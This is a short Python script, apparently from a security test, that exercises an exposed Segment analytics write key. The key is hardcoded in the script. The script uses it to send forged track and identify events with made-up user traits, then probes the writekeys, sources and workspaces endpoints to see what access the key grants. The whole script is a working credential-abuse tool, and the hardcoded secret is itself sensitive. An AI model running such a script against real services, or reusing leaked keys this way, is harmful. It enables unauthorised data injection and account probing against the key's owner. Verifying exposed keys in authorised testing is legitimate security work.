#!/usr/bin/env python3
import requests
import json
import time

write_key = "4Y6iYCZHd2D5xVGYpxGVLMkEmstys7eH"

print("[*] Testing Segment Write Key Exploitation\n")

# Test 1: Verify the key works
print("=" * 60)
print("[1] Verify Write Key")
print("=" * 60)

# Send a test track event
payload = {
    "userId": "test_user_123",
    "event": "Clicked Button",
    "properties": {
        "button_name": "Sign Up",
        "timestamp": int(time.time())
    }
}

r = requests.post(
    "https://api.segment.com/v1/track",
    json=payload,
    auth=(write_key, ""),
    timeout=5
)

print(f"Status: {r.status_code}")
print(f"Response: {r.text}\n")

# Test 2: Identify endpoint (user identification)
print("=" * 60)
print("[2] Identify User via Segment")
print("=" * 60)

payload = {
    "userId": "test_user_123",
    "traits": {
        "email": "test@example.com",
        "plan": "premium",
        "signupDate": "2024-01-01"
    }
}

r = requests.post(
    "https://api.segment.com/v1/identify",
    json=payload,
    auth=(write_key, ""),
    timeout=5
)

print(f"Status: {r.status_code}")
print(f"Response: {r.text}\n")

# Test 3: Get workspace info (if exposed)
print("=" * 60)
print("[3] Test Segment API Access")
print("=" * 60)

endpoints = [
    "https://api.segment.com/v1/writekeys",
    "https://api.segment.com/v1/sources",
    "https://api.segment.com/v1/workspaces",
]

for endpoint in endpoints:
    try:
        r = requests.get(endpoint, auth=(write_key, ""), timeout=5)
        print(f"[{r.status_code}] {endpoint}")
        if r.status_code < 400:
            print(f"  Response: {r.text[:200]}")
    except Exception as e:
        print(f"Error: {e}")

